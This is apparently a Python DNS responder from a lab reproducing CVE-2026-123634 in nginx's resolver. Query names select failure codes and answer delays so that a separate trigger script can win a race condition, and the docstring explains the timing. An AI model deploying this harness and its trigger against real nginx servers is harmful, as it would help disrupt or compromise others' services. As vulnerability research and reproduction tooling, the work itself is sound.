#!/usr/bin/env python3
"""Controllable authoritative DNS responder for the CVE-2026-123634 lab.

Stdlib-only UDP responder on :53. Every query's behavior is encoded in the
queried name, so the trigger client fully controls each attempt without
any side channel:

    <mode>-<delay_ms>-<seq>.u123634.test

    mode   behavior
    ----   --------
    sf     SERVFAIL (rcode 2)          — the failure-walk trigger
    rf     REFUSED (rcode 5)           — alternate failure code
    nx     NXDOMAIN (rcode 3)          — failure via nxdomain
    ok     NOERROR + A 127.0.0.1       — dead-IP success variant
                                         (nginx dials its own :80 -> refused)
    drop   no answer at all            — resolver-timeout control

    delay_ms  the answer is held this long after the query arrives (this
              is the race-control knob: it must cover the client's
              headers -> body -> RST interleaving, see poc/123634/trigger.py)

    seq       unique per attempt so names never hit the resolver cache
              (`valid=60s`; failures are not cached — the node is deleted
              after the failure walk — but success answers would be).

Only A queries are expected (nginx `ipv6=off`); the question section is
echoed verbatim, which is what nginx's parser requires (QDCOUNT=1,
question byte-identical, ident echoed). Flags are 0x8180|rcode
(QR+RD+RA, Z/AD/CD clear) — the mask nginx checks is (flags & 0xf870)
== 0x8000. Unknown names are answered REFUSED and logged, so accidental
queries from a mistyped config show up in `docker compose logs dns`.

Run inside the lab's dns service (S4 — never on the host):

    docker compose logs -f dns
"""

from __future__ import annotations

import socket
import threading
import time

MAGIC_SUFFIX = "u123634.test"
RCODES = {"sf": 2, "rf": 5, "nx": 3}
OK_ADDR = "127.0.0.1"  # dead upstream: nginx connects to its own :80 -> refused instantly

lock = threading.Lock()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", 53))


def parse_query(data: bytes):
    """Return (id, qname_wire, qname_string, qtype, qclass) or None."""
    if len(data) < 12:
        return None
    tid = int.from_bytes(data[0:2], "big")
    qdcount = int.from_bytes(data[4:6], "big")
    if qdcount != 1:
        return None
    i = 12
    labels = []
    while i < len(data):
        ln = data[i]
        if ln == 0:
            i += 1
            break
        if ln & 0xC0 or i + 1 + ln > len(data):
            return None
        labels.append(data[i + 1 : i + 1 + ln].decode("latin1"))
        i += 1 + ln
    if i + 4 > len(data):
        return None
    qtype = int.from_bytes(data[i : i + 2], "big")
    qclass = int.from_bytes(data[i + 2 : i + 4], "big")
    qname_wire = data[12 : i + 4]
    return tid, qname_wire, ".".join(labels), qtype, qclass


def build_response(tid: int, qname_wire: bytes, rcode: int, a_addr: str | None) -> bytes:
    header = bytes(
        [
            tid >> 8, tid & 0xFF,
            0x81, 0x80 | rcode,        # QR=1 RD=1 RA=1, rcode
            0, 1,                       # QDCOUNT
            0, 1 if a_addr else 0,      # ANCOUNT
            0, 0,                       # NSCOUNT
            0, 0,                       # ARCOUNT
        ]
    )
    resp = header + qname_wire
    if a_addr is not None:
        # answer: same name (uncompressed), type A, class IN, ttl 60, A rdata
        resp += qname_wire[:-4]
        resp += b"\x00\x01\x00\x01"          # type A, class IN
        resp += (60).to_bytes(4, "big")      # ttl
        resp += (4).to_bytes(2, "big")       # rdlength
        resp += socket.inet_aton(a_addr)
    return resp


def answer_later(addr, resp: bytes, qname: str, delay_s: float):
    def _send():
        try:
            with lock:
                sock.sendto(resp, addr)
            print(f"dnsd: answered {qname} -> {addr[0]}:{addr[1]} "
                  f"({delay_s * 1000:.0f} ms hold)", flush=True)
        except OSError as e:  # pragma: no cover - diagnostic only
            print(f"dnsd: send failed for {qname}: {e}", flush=True)

    if delay_s <= 0:
        _send()
    else:
        threading.Timer(delay_s, _send).start()


def main() -> None:
    print(f"dnsd: listening on 0.0.0.0:53, magic suffix .{MAGIC_SUFFIX}", flush=True)
    while True:
        try:
            data, addr = sock.recvfrom(4096)
        except OSError:
            continue
        q = parse_query(data)
        if q is None:
            print(f"dnsd: unparseable query from {addr}", flush=True)
            continue
        tid, qname_wire, qname, qtype, qclass = q
        if qtype != 1 or qclass != 1:
            # not an A/IN query: answer REFUSED, keep the parser happy
            answer_later(addr, build_response(tid, qname_wire, 5, None), qname, 0)
            print(f"dnsd: non-A query {qname} (type {qtype}) -> REFUSED", flush=True)
            continue

        parts = qname.split(".")
        first = parts[0] if parts else ""
        if not qname.endswith(MAGIC_SUFFIX) or "-" not in first:
            answer_later(addr, build_response(tid, qname_wire, 5, None), qname, 0)
            print(f"dnsd: unknown name {qname} -> REFUSED", flush=True)
            continue

        fields = first.split("-")
        mode = fields[0]
        try:
            delay_ms = int(fields[1]) if len(fields) > 1 else 0
        except ValueError:
            delay_ms = 0

        if mode in RCODES:
            print(f"dnsd: query {qname} from {addr[0]} -> rcode {mode} "
                  f"({RCODES[mode]}), hold {delay_ms} ms", flush=True)
            answer_later(addr, build_response(tid, qname_wire, RCODES[mode], None),
                         qname, delay_ms / 1000.0)
        elif mode == "ok":
            print(f"dnsd: query {qname} from {addr[0]} -> A {OK_ADDR}, "
                  f"hold {delay_ms} ms", flush=True)
            answer_later(addr, build_response(tid, qname_wire, 0, OK_ADDR),
                         qname, delay_ms / 1000.0)
        elif mode == "drop":
            print(f"dnsd: query {qname} from {addr[0]} -> DROP (no answer)",
                  flush=True)
        else:
            answer_later(addr, build_response(tid, qname_wire, 5, None), qname, 0)
            print(f"dnsd: unknown mode {mode!r} in {qname} -> REFUSED", flush=True)


if __name__ == "__main__":
    main()
